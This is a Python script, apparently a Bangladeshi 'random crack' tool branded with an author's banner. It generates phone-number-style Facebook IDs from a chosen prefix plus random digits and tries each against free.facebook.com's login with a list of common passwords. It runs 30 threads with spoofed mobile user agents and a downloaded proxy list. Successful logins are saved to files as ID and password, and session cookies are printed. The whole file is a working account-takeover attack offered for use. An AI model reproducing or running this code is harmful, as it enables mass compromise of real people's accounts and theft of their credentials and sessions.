#Sc Make By Asraful Islam Hasan
#Sc Gift By Hasan

#___________Impoet Module____________
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
#________________Step 2______________
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#_______________Coler Code_____________
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_____________Proxy______________
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for hasan in range(1010000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0.2','6.0.1','5.1.1','5.0','5.0.1','7.0','10','11','12','13','14','15','16','17','18','19','20'])
	c='SAMSUNG SM-A500FU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/'
	d=random.randrange(40,100)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	asha=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(asha)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ('''\033[1;97m
          \033[38;5;46m╔═════════════════════════════════════╗
          \033[38;5;196m║\033[38;5;45m<>\033[38;5;192m<>\033[38;5;46m<>\033[38;5;195m 𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄 𝐓𝐀𝐇𝐄𝐃𝐔𝐋 𝐖𝐎𝐑𝐋𝐃 \033[38;5;45m<>\033[38;5;192m<>\033[38;5;46m<> \033[38;5;196m║
   \033[38;5;192m╔═════════════════════════════════════════════════════╗
   \033[38;5;196m║ \033[38;5;192m<>\033[38;5;46m<>\033[38;5;195m𝐓\033[38;5;45m<>\033[38;5;46m  _________   __ _________  __  ____  \033[38;5;192m<>\033[38;5;45m<>\033[38;5;195m𝐃\033[38;5;46m<>\033[38;5;196m║
   \033[38;5;196m║ \033[38;5;192m<>\033[38;5;46m<>\033[38;5;195m𝐀\033[38;5;45m<>\033[38;5;46m /_  __/ _ | / // / __/ _ \/ / / / /  \033[38;5;192m<>\033[38;5;45m<>\033[38;5;195m𝐔\033[38;5;46m<>\033[38;5;196m║
   \033[38;5;196m║ \033[38;5;192m<>\033[38;5;46m<>\033[38;5;195m𝐇\033[38;5;45m<>\033[38;5;46m  / / / __ |/ _  / _// // / /_/ / /__ \033[38;5;192m<>\033[38;5;45m<>\033[38;5;195m𝐋\033[38;5;46m<>\033[38;5;196m║
   \033[38;5;196m║ \033[38;5;192m<>\033[38;5;46m<>\033[38;5;195m𝐄\033[38;5;45m<>\033[38;5;46m /_/ /_/ |_/_//_/___/____/\____/____/ \033[38;5;192m<>\033[38;5;45m<>\033[38;5;195m \033[38;5;46m<>\033[38;5;196m║
   \033[38;5;192m╚═════════════════════════════════════════════════════╝
   \033[38;5;46m╔═══════════════════════════════════════════════════╗
   \033[38;5;196m║ \033[38;5;192m[\033[38;5;45m✓\033[38;5;192m] \033[38;5;195mCREATED BY  \033[38;5;46m <\033[38;5;192m║\033[38;5;196m<>\033[38;5;45m𝐓\033[38;5;196m<>\033[38;5;192m║\033[38;5;46m> \033[38;5;191 𝐆𝐅𝐗 𝐓𝐀𝐇𝐄𝐃𝐔𝐋             \033[38;5;196m║
   \033[38;5;196m║ \033[38;5;192m[\033[38;5;45m✓\033[38;5;192m] \033[38;5;195mFACEBOK      \033[38;5;46m<\033[38;5;192m║\033[38;5;196m<>\033[38;5;45m𝐀\033[38;5;196m<>\033[38;5;192m║\033[38;5;46m>\033[38;5;191m ƬƛӇЄƊƲԼ ヽ・　T.T      \033[38;5;196m║
   \033[38;5;196m║ \033[38;5;192m[\033[38;5;45m✓\033[38;5;192m] \033[38;5;195mGITHUB       \033[38;5;46m<\033[38;5;192m║\033[38;5;196m<>\033[38;5;45m𝐇\033[38;5;196m<>\033[38;5;192m║\033[38;5;46m> \033[38;5;191 X𝐓𝐀𝐇𝐄𝐃𝐔𝐋-4𝐗             \033[38;5;196m║
   \033[38;5;196m║ \033[38;5;192m[\033[38;5;45m✓\033[38;5;192m] \033[38;5;195mTOOL STATUS  \033[38;5;46m<\033[38;5;192m║\033[38;5;196m<>\033[38;5;45m𝐄\033[38;5;196m<>\033[38;5;192m║\033[38;5;46m>\033[38;5;191m 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊           \033[38;5;196m║
   \033[38;5;196m║ \033[38;5;192m[\033[38;5;45m✓\033[38;5;192m] \033[38;5;195mTOOL VIRSION \033[38;5;46m<\033[38;5;192m║\033[38;5;196m<>\033[38;5;45m𝐃\033[38;5;196m<>\033[38;5;192m║\033[38;5;46m> \033[38;5;191m0.0                    \033[38;5;196m║
   \033[38;5;196m║ \033[38;5;192m[\033[38;5;45m✓\033[38;5;192m] \033[38;5;195mWHATSAPP     \033[38;5;46m<\033[38;5;192m║\033[38;5;196m<>\033[38;5;45m𝐔\033[38;5;196m<>\033[38;5;192m║\033[38;5;46m>\033[38;5;191m 01955749454            \033[38;5;196m║
   \033[38;5;196m║ \033[38;5;192m[\033[38;5;45m✓\033[38;5;192m] \033[38;5;195mUPDATE TIME  \033[38;5;46m<\033[38;5;192m║\033[38;5;196m<>\033[38;5;45m𝐋\033[38;5;196m<>\033[38;5;192m║\033[38;5;46m> \033[38;5;191mDT-13/06/23 -01.00 Am  \033[38;5;196m║
   \033[38;5;46m╚═══════════════════════════════════════════════════╝
''')
 
def naima():
	print('-------------------')
#_____________Def Main______________ 
def Main():
        os.system("clear")
        print(logo)
        print(" [1] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊")
        print(" [0] 𝐄𝐱𝐢𝐭")
        Sumaiya =input("\n [?] 𝐂𝐇𝐎𝐎𝐒𝐄 : ")
        if Sumaiya in ["1","01"]:
            fuck()
        if Sumaiya in [" 0", "00"]:
            exit()
        else:
            exit()
#______________Def Sc__________            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[×] 𝐄𝐗𝐌: 019, 016, 017, 018, 014, 014')
    code = input('[?] 𝐂𝐇𝐎𝐈𝐂𝐄 𝐘𝐎𝐔𝐑 𝐂𝐎𝐃𝐄 : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[×] 𝐄𝐗𝐌: 2000 3000 5000 10000 ')
    limit = int(input('[?] 𝐂𝐇𝐎𝐈𝐂𝐄 𝐘𝐎𝐔𝐑 𝐋𝐈𝐌𝐈𝐓 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] Total ids: '+tl)
        print("[×] Your Code: "+code)
        print('[×] Airplne Moode On/Off')
        print('[×] Process has been started')
        print('-------------------')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','Free Fire','57273200','I Love You','@@@###','@@@123']
            asha.submit(hasan,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as Tahedul-OK.txt')
    print(' [✓] CP Id Save as Tahedul-CP.txt')
    print('-------------------')
def hasan(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[𝐓𝐀𝐇𝐄𝐃𝐔𝐋]--[%s/%s]--[𝐎𝐊😌-%s]~[𝐂𝐏💔-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'free.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'referer': 'https://free.facebook.com/login/?li=gWqHZHuEl5tC0PmBZSB1Ofgx&e=1348029&shbl=1&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"/033[1;92m[𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐎𝐊] {uid}|{ps} \n\033[1;95mCookie : {coki}")
                open('/sdcard/𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐎𝐊😌.𝐭𝐱𝐭', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"/033[1;91m[𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐂𝐏] {cid}|{ps}")
                open('/sdcard/𝐓𝐀𝐇𝐄𝐃𝐔𝐋-𝐂𝐏💔.𝐭𝐱𝐭', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
